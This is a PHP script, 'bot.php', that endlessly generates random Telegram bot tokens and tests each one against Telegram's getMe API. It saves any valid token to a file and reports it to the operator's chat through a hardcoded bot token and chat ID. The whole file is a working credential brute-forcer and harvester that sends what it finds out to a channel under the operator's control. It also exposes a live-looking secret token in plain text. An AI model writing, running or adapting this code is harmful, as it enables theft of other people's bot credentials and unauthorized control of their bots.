<?php
// bot.php

session_start();

if (!isset($_SESSION['failedCount'])) {
    $_SESSION['failedCount'] = 0;
    $_SESSION['totalChecks'] = 0;
}

$botToken = '6629617593:AAGNWcZ5EaAbBRmwhDPkWy7S0XudjyZFYDk'; // Replace with your bot's token
$chatId = '5079629749'; // Replace with your chat ID
$filePath = 'valid_tokens.txt'; // File to store valid tokens

function generateRealisticToken() {
    $botId = '';
    for ($i = 0; $i < rand(7, 10); $i++) {
        $botId .= rand(0, 9);
    }
    $secret = '';
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-';
    for ($i = 0; $i < 35; $i++) {
        $secret .= $characters[rand(0, strlen($characters) - 1)];
    }
    return "$botId:$secret";
}

function checkToken($token) {
    global $botToken, $chatId, $filePath;

    $_SESSION['totalChecks']++;
    $url = "https://api.telegram.org/bot$token/getMe";
    $response = @file_get_contents($url);

    if ($response !== false) {
        echo "Token valid: $token<br>";
        file_put_contents($filePath, "$token\n", FILE_APPEND);
        sendMessage("Found valid token: $token\nTotal checks: " . $_SESSION['totalChecks']);
        return true;
    } else {
        $_SESSION['failedCount']++;
        if ($_SESSION['failedCount'] % 20 == 0) {
            sendMessage("Failed token check #$_SESSION[failedCount]: $token\nTotal checks: " . $_SESSION['totalChecks']);
        }
        echo "Token invalid: $token<br>";
        return false;
    }
}

function sendMessage($message) {
    global $botToken, $chatId;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

function findTokens() {
    global $filePath;

    // Ensure the file exists and is writable
    if (!file_exists($filePath)) {
        file_put_contents($filePath, "");
    }

    while (true) { // Loop indefinitely
        $token = generateRealisticToken();
        checkToken($token);
        sleep(1);  // Delay to avoid rate-limiting
    }
}

// Start the token finding process
findTokens();
?>
